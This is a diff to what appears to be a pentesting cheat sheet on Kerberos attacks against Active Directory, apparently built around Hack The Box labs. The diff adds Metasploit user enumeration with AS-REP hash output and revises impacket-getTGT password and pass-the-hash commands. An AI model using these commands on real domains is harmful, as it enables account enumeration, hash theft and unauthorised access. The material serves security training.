@@ -6,7 +6,8 @@ tags: ["Kerberos", "Pass-The-Ticket", "Hash Cracking", "Rubeus", "Password Crack
 
 ### Usernames enum
 
-{{< tab set1 tab1 active >}}kerbrute{{< /tab >}}
+{{< tab set1 tab1 >}}kerbrute{{< /tab >}}
+{{< tab set1 tab2 >}}metasploit{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
@@ -39,10 +40,45 @@ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop
 <small>*Ref: [kerbrute](https://github.com/ropnop/kerbrute)*</small>
 
 {{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+```console
+use auxiliary/gather/kerberos_enumusers
+```
+
+```console
+set user_file <USERNAMES_FILE>
+```
+
+```console
+set rhosts <DC>
+```
+
+```console
+set domain <DOMAIN>
+```
+
+```console
+run
+```
+
+```console {class="sample-code"}
+msf6 auxiliary(gather/kerberos_enumusers) > run
+
+[*] Using domain: DANTE - 172.16.2.1:88        ...
+[*] 172.16.2.1 - User: "user1" user not found
+[*] 172.16.2.1 - User: "user2" user not found
+[*] 172.16.2.1 - User: "user3" user not found
+[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ...[SNIP]... 9161d63be1
+...[SNIP]...
+[*] Auxiliary module execution completed
+```
+
+{{< /tabcontent >}}
 
 ### Usernames generator
 
-{{< tab set2 tab1 active >}}username-anarchy{{< /tab >}}
+{{< tab set2 tab1 >}}username-anarchy{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 ```console
@@ -67,7 +103,7 @@ jamerobe
 
 ### Generate Kerberos ticket (From Linux)
 
-{{< tab set3 tab1 active >}}Kinit{{< /tab >}}
+{{< tab set3 tab1 >}}Kinit{{< /tab >}}
 {{< tab set3 tab2 >}}Impacket{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
@@ -197,7 +233,7 @@ ktutil:  exit
 ```
 
 ```console
-kinit -V -k -t <USER>.keytab -f <USER>@<DOMAIN>
+kinit -V -k -t '<USER>.keytab' -f '<USER>@<DOMAIN>'
 ```
 
 ```console {class="sample-code"}
@@ -229,11 +265,11 @@ Valid starting     Expires            Service principal
 
 ```console
 # With password
-sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>'
+sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
-$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-getTGT 'ABSOLUTE.HTB/m.lovegod'
+$ sudo ntpdate -s DC.ABSOLUTE.HTB && impacket-getTGT 'ABSOLUTE.HTB/m.lovegod' 
 Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 
 Password:
@@ -242,7 +278,7 @@ Password:
 
 ```console
 # With hash
-sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> '<DOMAIN>/<USER>'
+sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -hashes :<HASH> -dc-ip <DC_IP>
 ```
 
 ```console {class="sample-code"}
@@ -254,7 +290,7 @@ Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its a
 
 ```console
 # Import ticket
-export KRB5CCNAME=<USER>.ccache
+export KRB5CCNAME='<USER>.ccache'
 ```
 
 ```console {class="sample-code"}
@@ -280,7 +316,7 @@ Valid starting     Expires            Service principal
 
 ### Generate Kerberos ticket (From Windows)
 
-{{< tab set4 tab1 active >}}rubeus{{< /tab >}}
+{{< tab set4 tab1 >}}rubeus{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
 ```console
@@ -406,7 +442,7 @@ Cached Tickets: (2)
 
 ### Generate Kerberos ticket (From C2)
 
-{{< tab set5 tab1 active >}}Sliver{{< /tab >}}
+{{< tab set5 tab1 >}}Sliver{{< /tab >}}
 {{< tabcontent set5 tab1 >}}
 
 ```console
@@ -529,7 +565,7 @@ Cached Tickets: (1)
 
 ### Winrm with Kerberos
 
-{{< tab set6 tab1 active >}}evil-winrm{{< /tab >}}
+{{< tab set6 tab1 >}}evil-winrm{{< /tab >}}
 {{< tab set6 tab2 >}}wmiexec{{< /tab >}}
 {{< tabcontent set6 tab1 >}}
 
